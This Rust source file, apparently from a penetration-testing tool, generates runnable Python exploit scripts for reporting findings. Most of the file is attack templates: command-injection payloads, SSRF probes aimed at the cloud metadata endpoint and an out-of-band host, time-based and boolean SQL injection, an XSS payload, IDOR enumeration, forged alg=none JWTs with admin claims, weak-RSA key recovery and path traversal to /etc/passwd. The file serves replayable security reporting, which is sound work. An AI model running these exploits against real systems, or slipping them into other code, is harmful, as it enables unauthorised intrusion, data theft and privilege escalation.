//! PoC (proof-of-concept) generator: produces standalone Python exploits for a
//! finding so a report item has a replayable artifact. Port of FBHBot's
//! `generate_poc` tool (Python `requests` based, self-contained).

use serde::{Deserialize, Serialize};
use std::path::Path;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
pub enum PoCKinds {
    Rce,
    Ssrf,
    Sqli,
    Xss,
    Idor,
    JwtNone,
    RsaWeak,
    PathTraversal,
    Generic,
}

impl PoCKinds {
    pub fn label(&self) -> &'static str {
        match self {
            PoCKinds::Rce => "rce",
            PoCKinds::Ssrf => "ssrf",
            PoCKinds::Sqli => "sqli",
            PoCKinds::Xss => "xss",
            PoCKinds::Idor => "idor",
            PoCKinds::JwtNone => "jwt_none",
            PoCKinds::RsaWeak => "rsa_weak",
            PoCKinds::PathTraversal => "path_traversal",
            PoCKinds::Generic => "generic",
        }
    }

    pub fn from_label(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "rce" | "remote_code_execution" => Some(PoCKinds::Rce),
            "ssrf" => Some(PoCKinds::Ssrf),
            "sqli" | "sql_injection" => Some(PoCKinds::Sqli),
            "xss" => Some(PoCKinds::Xss),
            "idor" | "insecure_direct_object_reference" => Some(PoCKinds::Idor),
            "jwt_none" | "jwt-none" => Some(PoCKinds::JwtNone),
            "rsa_weak" | "weak_rsa" => Some(PoCKinds::RsaWeak),
            "path_traversal" | "lfi" => Some(PoCKinds::PathTraversal),
            "generic" => Some(PoCKinds::Generic),
            _ => None,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PoCOptions {
    #[serde(default)]
    pub target: String, // scheme://host[:port]
    #[serde(default)]
    pub endpoint: String, // path, e.g. /api/search
    #[serde(default)]
    pub method: String, // GET/POST/etc
    #[serde(default)]
    pub param: String, // vulnerable parameter name
    #[serde(default)]
    pub auth_header: Option<String>,
    #[serde(default)]
    pub extra: Option<String>,
}

impl Default for PoCOptions {
    fn default() -> Self {
        Self {
            target: "http://127.0.0.1".to_string(),
            endpoint: "/".to_string(),
            method: "GET".to_string(),
            param: "q".to_string(),
            auth_header: None,
            extra: None,
        }
    }
}

/// Render a complete, runnable Python script that reproduces the finding.
pub fn generate_poc(kind: PoCKinds, opts: &PoCOptions) -> String {
    let url = format!("{}{}", opts.target.trim_end_matches('/'), opts.endpoint);
    let auth_lines = match &opts.auth_header {
        Some(h) if !h.is_empty() => format!("    headers[\"Authorization\"] = \"{h}\"\n"),
        _ => String::new(),
    };

    let body = match kind {
        PoCKinds::Rce => format!(
            concat!(
                "import requests, sys\n",
                "import urllib.parse\n",
                "\n",
                "TARGET = \"{url}\"\n",
                "head = {{\"User-Agent\": \"sentinel-poc\"}}\n",
                "{auth}",
                "\n",
                "# RCE probe: time-based sleep + command echo\n",
                "payloads = [\n",
                "    \"$(sleep 5)\",\n",
                "    \"`sleep 5`\",\n",
                "    \"%3Bwhoami\",\n",
                "    \"|id\",\n",
                "    \"||whoami\",\n",
                "    \"; sys.exit()\",\n",
                "]\n",
                "marker = \"PWNED-{rand}\"\n",
                "for p in payloads:\n",
                "    r = requests.get(TARGET, params={{\"{param}\": p}}, headers=head, timeout=12)\n",
                "    if marker in r.text or \"uid=\" in r.text or len(r.text) > 20000:\n",
                "        print(\"[VULN] likely RCE via\", p)\n",
                "        sys.exit(0)\n",
                "print(\"[SAFE] no RCE observed\")\n",
                "sys.exit(1)\n",
            ),
            url = url,
            auth = auth_lines,
            param = opts.param,
            rand = rand_suffix(),
        ),
        PoCKinds::Ssrf => format!(
            concat!(
                "import requests, sys\n",
                "\n",
                "TARGET = \"{url}\"\n",
                "head = {{\"User-Agent\": \"sentinel-poc\"}}\n",
                "{auth}",
                "\n",
                "# SSRF: force the server to fetch an attacker URL\n",
                "collab = \"{collab}\"\n",
                "probes = [\n",
                "    \"http://127.0.0.1:22\",\n",
                "    \"http://169.254.169.254/latest/meta-data/\",\n",
                "    collab,\n",
                "]\n",
                "for p in probes:\n",
                "    try:\n",
                "        r = requests.get(TARGET, params={{\"{param}\": p}}, headers=head, timeout=8)\n",
                "        print(\"[*]\", r.status_code)\n",
                "    except Exception as e:\n",
                "        print(\"[!]\", e)\n",
                "print(\"[DONE] check OAST collab for hit\")\n",
            ),
            url = url,
            auth = auth_lines,
            param = opts.param,
            collab = opts.extra.clone().unwrap_or_else(|| "oast.example".to_string()),
        ),
        PoCKinds::Sqli => format!(
            concat!(
                "import requests, sys\n",
                "import time\n",
                "\n",
                "TARGET = \"{url}\"\n",
                "head = {{\"User-Agent\": \"sentinel-poc\"}}\n",
                "{auth}",
                "\n",
                "# SQLi: boolean + time based\n",
                "t0 = time.time()\n",
                "r = requests.get(TARGET, params={{\"{param}\": \"1' AND SLEEP(5)-- -\"}}, headers=head, timeout=15)\n",
                "delay = time.time() - t0\n",
                "if delay >= 4:\n",
                "    print(\"[VULN] time-based SQLi confirmed ({{delay:.1f}}s)\")\n",
                "    sys.exit(0)\n",
                "r2 = requests.get(TARGET, params={{\"{param}\": \"' OR '1'='1\"}}, headers=head, timeout=10)\n",
                "if \"error\" in r2.text.lower() and \"sql\" in r2.text.lower():\n",
                "    print(\"[VULN] SQL error surfaced\")\n",
                "    sys.exit(0)\n",
                "print(\"[SAFE] no SQLi observed\")\n",
                "sys.exit(1)\n",
            ),
            url = url,
            auth = auth_lines,
            param = opts.param,
        ),
        PoCKinds::Xss => format!(
            concat!(
                "import requests, sys\n",
                "\n",
                "TARGET = \"{url}\"\n",
                "head = {{\"User-Agent\": \"sentinel-poc\"}}\n",
                "{auth}",
                "\n",
                "# XSS: reflected payload markers\n",
                "payload = \"<svg/onload=alert(1)><!--SENTINEL-PWNED-->\"\n",
                "r = requests.get(TARGET, params={{\"{param}\": payload}}, headers=head, timeout=10)\n",
                "if \"SENTINEL-PWNED\" in r.text and \"<svg\" in r.text:\n",
                "    print(\"[VULN] reflected XSS, payload echoed unencoded\")\n",
                "    sys.exit(0)\n",
                "if payload in r.text:\n",
                "    print(\"[VULN] marker reflected (likely injectable)\")\n",
                "    sys.exit(0)\n",
                "print(\"[SAFE] payload filtered/encoded\")\n",
                "sys.exit(1)\n",
            ),
            url = url,
            auth = auth_lines,
            param = opts.param,
        ),
        PoCKinds::Idor => format!(
            concat!(
                "import requests, sys\n",
                "\n",
                "TARGET = \"{url}\"\n",
                "head = {{\"User-Agent\": \"sentinel-poc\"}}\n",
                "{auth}",
                "\n",
                "# IDOR: enumerate adjacent object ids with the SAME session\n",
                "for i in range(1, 6):\n",
                "    r = requests.get(TARGET.replace(\"{{id}}\", str(i)), headers=head, timeout=10)\n",
                "    print(i, r.status_code, len(r.text))\n",
                "    if r.status_code == 200 and len(r.text) > 50:\n",
                "        print(\"[VULN] object\", i, \"accessible without ownership\")\n",
                "        sys.exit(0)\n",
                "print(\"[SAFE] no IDOR over id range\")\n",
                "sys.exit(1)\n",
            ),
            url = url,
            auth = auth_lines,
        ),
        PoCKinds::JwtNone => format!(
            concat!(
                "import requests, sys\n",
                "import base64, json\n",
                "\n",
                "# JWT alg=none: forge an unsigned token with the victim role\n",
                "def b64url(raw):\n",
                "    return base64.urlsafe_b64encode(raw).rstrip(b\"=\").decode()\n",
                "\n",
                "header = b64url(json.dumps({{\"alg\": \"none\", \"typ\": \"JWT\"}}).encode())\n",
                "payload = b64url(json.dumps({{\"sub\": \"admin\", \"role\": \"admin\", \"admin\": True}}).encode())\n",
                "forge = f\"{{header}}.{{payload}}.\"\n",
                "print(\"[*] forged JWT\", forge)\n",
                "r = requests.get(\"{url}\", headers={{\"Authorization\": f\"Bearer {{forge}}\", \"User-Agent\": \"sentinel-poc\"}}, timeout=10)\n",
                "if r.status_code in (200, 301, 302):\n",
                "    print(\"[VULN] alg=none token accepted\", r.status_code)\n",
                "    sys.exit(0)\n",
                "print(\"[SAFE] alg=none rejected\")\n",
                "sys.exit(1)\n",
            ),
            url = url,
        ),
        PoCKinds::RsaWeak => format!(
            concat!(
                "import requests, sys\n",
                "import base64, json\n",
                "\n",
                "# RSA weak-key: derive d from a small n surrendered by the server\n",
                "def egcd(a, b):\n",
                "    if a == 0:\n",
                "        return b, 0, 1\n",
                "    g, x, y = egcd(b % a, a)\n",
                "    return g, y - (b // a) * x, x\n",
                "\n",
                "def inv(a, m):\n",
                "    g, x, _ = egcd(a, m)\n",
                "    if g != 1:\n",
                "        raise ValueError(\"no inverse\")\n",
                "    return x % m\n",
                "\n",
                "def factor(n):\n",
                "    i = 2\n",
                "    while i * i <= n:\n",
                "        if n % i == 0:\n",
                "            return i, n // i\n",
                "        i += 1\n",
                "    return None\n",
                "\n",
                "# replace N below with the Weak modulus from the token dump\n",
                "N = {n}\n",
                "e = 65537\n",
                "pq = factor(N)\n",
                "if not pq:\n",
                "    print(\"[SAFE] modulus not trivially factorable\")\n",
                "    sys.exit(1)\n",
                "p, q = pq\n",
                "d = inv(e, (p - 1) * (q - 1))\n",
                "print(f\"[VULN] p={{p}}, q={{q}}, d={{d}}\")\n",
                "sys.exit(0)\n",
            ),
            n = opts.extra.clone().unwrap_or_else(|| "977011".to_string()),
        ),
        PoCKinds::PathTraversal => format!(
            concat!(
                "import requests, sys\n",
                "\n",
                "TARGET = \"{url}\"\n",
                "head = {{\"User-Agent\": \"sentinel-poc\"}}\n",
                "{auth}",
                "\n",
                "# Path traversal: read /etc/passwd via encoded traversals\n",
                "payloads = [\n",
                "    \"../../../etc/passwd\",\n",
                "    \"..%2F..%2F..%2Fetc%2Fpasswd\",\n",
                "    \"%252e%252e%252fetc%252fpasswd\",\n",
                "    \"....//....//etc/passwd\",\n",
                "]\n",
                "for p in payloads:\n",
                "    r = requests.get(TARGET, params={{\"{param}\": p}}, headers=head, timeout=10)\n",
                "    if \"root:\" in r.text and \"nobody:\" in r.text:\n",
                "        print(\"[VULN] path traversal via\", p)\n",
                "        sys.exit(0)\n",
                "print(\"[SAFE] traversal blocked\")\n",
                "sys.exit(1)\n",
            ),
            url = url,
            auth = auth_lines,
            param = opts.param,
        ),
        PoCKinds::Generic => format!(
            concat!(
                "import requests, sys\n",
                "\n",
                "TARGET = \"{url}\"\n",
                "head = {{\"User-Agent\": \"sentinel-poc\", \"Content-Type\": \"application/json\"}}\n",
                "{auth}",
                "\n",
                "r = requests.{method_lower}(TARGET, json={{\"{param}\": \"{probe}\"}}, headers=head, timeout=10)\n",
                "print(r.status_code, r.text[:500])\n",
                "print(\"[DONE] review response manually\")\n",
            ),
            url = url,
            auth = auth_lines,
            method_lower = opts.method.to_lowercase(),
            param = opts.param,
            probe = "sentinel-poc",
        ),
    };
    body
}

fn rand_suffix() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let t = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    let hex = format!("{t:x}");
    hex[hex.len().saturating_sub(6)..].to_string()
}

/// Write a PoC to `work_dir/pocs/<target>-<kind>.py`; returns the path.
pub fn write_poc(
    work_dir: &Path,
    target: &str,
    kind: PoCKinds,
    opts: &PoCOptions,
) -> Result<std::path::PathBuf, String> {
    let dir = work_dir.join("pocs");
    std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    let slug = target
        .trim_start_matches("http://")
        .trim_start_matches("https://")
        .chars()
        .map(|c| {
            if c.is_alphanumeric() || c == '.' {
                c
            } else {
                '_'
            }
        })
        .collect::<String>();
    let name = format!("{}-{}.py", slug, kind.label());
    let path = dir.join(name);
    let body = generate_poc(kind, opts);
    std::fs::write(&path, body).map_err(|e| e.to_string())?;
    Ok(path)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rce_poc_contains_sleep_and_url() {
        let mut o = PoCOptions::default();
        o.target = "https://example.com".into();
        o.endpoint = "/api/exec".into();
        o.param = "cmd".into();
        let code = generate_poc(PoCKinds::Rce, &o);
        assert!(code.contains("/api/exec"));
        assert!(code.contains("sleep 5"));
        assert!(code.contains("cmd"));
    }

    #[test]
    fn sqli_poc_contains_time_based() {
        let code = generate_poc(
            PoCKinds::Sqli,
            &PoCOptions {
                target: "http://t".into(),
                endpoint: "/search".into(),
                param: "q".into(),
                ..Default::default()
            },
        );
        assert!(code.contains("SLEEP(5)"));
    }

    #[test]
    fn jwt_none_poc_forges_header() {
        let code = generate_poc(PoCKinds::JwtNone, &Default::default());
        assert!(code.contains("\"alg\": \"none\""));
    }

    #[test]
    fn from_label_roundtrip() {
        assert_eq!(PoCKinds::from_label("sqli"), Some(PoCKinds::Sqli));
        assert_eq!(PoCKinds::from_label("JWT_None"), Some(PoCKinds::JwtNone));
        assert_eq!(PoCKinds::from_label("nope"), None);
    }
}
